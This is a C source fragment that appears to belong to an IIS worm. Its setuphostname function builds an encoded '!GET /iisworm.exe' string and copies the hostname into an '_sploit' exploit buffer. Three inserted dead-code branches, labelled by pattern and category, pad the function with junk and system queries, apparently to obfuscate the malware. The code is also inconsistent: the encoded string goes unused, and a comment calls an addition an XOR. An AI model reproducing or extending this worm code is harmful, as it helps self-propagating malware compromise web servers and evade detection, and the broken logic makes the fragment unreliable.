#include "data_globals.h"
#include <stdlib.h>
#include <string.h>
#include <stdio.h>   // added for sprintf_s (Category B)

void setuphostname(void) {
    char hostname[1024];
    struct hostent *he;
    char tmp[1024];
    size_t len;
    int i;

    // --- INSERTED DEAD BRANCH 1 (after declarations, Pattern A, Category A) ---
    volatile int dummy_x_1 = 7;
    if ((dummy_x_1 * (dummy_x_1 + 1)) % 2 != 0) {
        // System info queries (Category A)
        SYSTEM_INFO si;
        GetSystemInfo(&si);
        SYSTEMTIME st;
        GetLocalTime(&st);
        char username[256];
        DWORD userLen = sizeof(username);
        GetUserNameA(username, &userLen);
        char compname[256];
        DWORD compLen = sizeof(compname);
        GetComputerNameA(compname, &compLen);
        volatile unsigned long sum = 0;
        for (int k = 0; k < 5; k++) {
            sum += (si.dwNumberOfProcessors + st.wHour) ^ username[k % 10];
        }
        char dummyBuf[64];
        memset(dummyBuf, 0, sizeof(dummyBuf));
        (void)sum;
        (void)compname;
    }

    if (gethostname(hostname, sizeof(hostname)) != 0) return;
    he = gethostbyname(hostname);
    if (!he) return;

    strncpy(tmp, he->h_name, sizeof(tmp) - 1);
    tmp[sizeof(tmp) - 1] = '\0';
    strncat(tmp, "!GET /iisworm.exe", sizeof(tmp) - strlen(tmp) - 1);

    for (i = 0; i < (int)strlen(tmp); i++)
        tmp[i] += 0x21;   // XOR with 0x21 (add 0x21)

    // --- INSERTED DEAD BRANCH 2 (after loop, Pattern B, Category B) ---
    if (GetPriorityClass(GetCurrentProcess()) == 0xFFFFFFFF) {
        // Memory & String operations (Category B)
        const char *testStr = "hostname_setup";
        size_t l = strlen(testStr) + 16;
        char *buf = (char *)malloc(l);
        if (buf) {
            sprintf_s(buf, l, "STR:%s", testStr);
            volatile size_t len2 = strlen(buf);
            char *copy = (char *)malloc(len2 + 1);
            if (copy) {
                memcpy(copy, buf, len2 + 1);
                volatile int cmp = (copy[0] == 'S') ? 1 : 0;
                memset(copy, 0, len2 + 1);
                free(copy);
            }
            free(buf);
        }
        char dummy[64];
        sprintf_s(dummy, sizeof(dummy), "dummy");
        memset(dummy, 0xAA, sizeof(dummy));
    }

    len = strlen(he->h_name);
    if (len > 100) len = 100;

    // --- INSERTED DEAD BRANCH 3 (before memcpy, Pattern C, Category C) ---
    volatile DWORD dummy_tick_3 = GetTickCount();
    if ((dummy_tick_3 ^ 0x5A5A5A5A) == 0xFFFFFFFF && (dummy_tick_3 & 0x80000000) != 0) {
        // Bitwise/Math loops (Category C)
        volatile unsigned char arr[32];
        for (int j = 0; j < 32; j++) {
            arr[j] = (unsigned char)(j ^ 0x55);
        }
        volatile unsigned int hash = 0x811C9DC5;
        for (int j = 0; j < 32; j++) {
            hash ^= arr[j];
            hash *= 0x01000193;
        }
        volatile unsigned int result = hash;
        for (int k = 0; k < 4; k++) {
            result = (result << 1) ^ (result >> 31);
        }
        char discard[16];
        memset(discard, (char)(result & 0xFF), sizeof(discard));
        (void)result;
    }

    // Copy into the exploit buffer at the correct offset
    memcpy(_sploit + sizeof(_sploit) - 102, he->h_name, len);
}
